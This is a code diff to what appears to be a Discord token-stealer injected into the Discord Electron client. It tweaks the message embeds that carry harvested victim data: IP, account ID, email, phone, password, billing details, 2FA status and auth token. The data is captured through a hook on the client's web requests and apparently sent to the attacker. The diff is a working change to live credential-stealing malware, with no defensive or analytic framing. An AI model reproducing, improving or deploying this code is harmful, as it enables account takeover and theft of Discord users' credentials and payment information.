@@ -55,6 +55,7 @@ async function execScript(str) {
 
 const makeEmbed = async ({
     fields,
+    title,
     image,
     thumbnail,
     description
@@ -64,6 +65,7 @@ const makeEmbed = async ({
         content: "",
         embeds: [{
             color: config["embed-color"],
+            title: title,
             fields: fields,
             description: description ?? "",
             
@@ -224,15 +226,15 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: `\`${user.username}\``,
             fields: [
-                { name: "IP:", value: `${ip}`, inline: false },
-                { name: "ID:", value: `${user.id}`, inline: false },
-                { name: "Nitro:", value: `${GetNitro(Nitro)}`, inline: false },
-                { name: "NSFW:", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
-                { name: "2FA:", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
-                { name: "Billing:", value: `${Billings}`, inline: false },
-                { name: "Email:", value: `${user.email}`, inline: false },
-                { name: "Phone:", value: `${user.phone ?? "None"}`, inline: false },
-                { name: "Token:", value: `${token}`, inline: false }
+                { name: "IP", value: `\`${ip}\``, inline: false },
+                { name: "ID", value: `\`${user.id}\``, inline: false },
+                { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
+                { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                { name: "Billing", value: `${Billings}`, inline: false },
+                { name: "Email", value: `\`${user.email}\``, inline: false },
+                { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
+                { name: "Token", value: `\`${token}\``, inline: false }
             ],
             image: userBanner,
             thumbnail: userAvatar,
@@ -344,16 +346,16 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var params = await makeEmbed({
                 title: `\`${user.username}\``,
                 fields: [
-                    { name: "IP:", value: `${ip}`, inline: false },
-                    { name: "ID:", value: `${user.id}`, inline: false },
-                    { name: "Nitro:", value: `${GetNitro(Nitro)}`, inline: false },
-                    { name: "NSFW:", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
-                    { name: "2FA:", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
-                    { name: "Billing:", value: `${Billings}`, inline: false },
-                    { name: "Email:", value: `${user.email}`, inline: false },
-                    { name: "Password:", value: `${password}`, inline: false },
-                    { name: "Phone:", value: `${user.phone ?? "None"}`, inline: false },
-                    { name: "Token:", value: `${token}`, inline: false }
+                    { name: "IP", value: `\`${ip}\``, inline: false },
+                    { name: "ID", value: `\`${user.id}\``, inline: false },
+                    { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
+                    { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                    { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                    { name: "Billing", value: `${Billings}`, inline: false },
+                    { name: "Email", value: `\`${user.email}\``, inline: false },
+                    { name: "Password", value: `\`${password}\``, inline: false },
+                    { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
+                    { name: "Token", value: `\`${token}\``, inline: false }
                 ],
                 image: userBanner,
                 thumbnail: userAvatar,
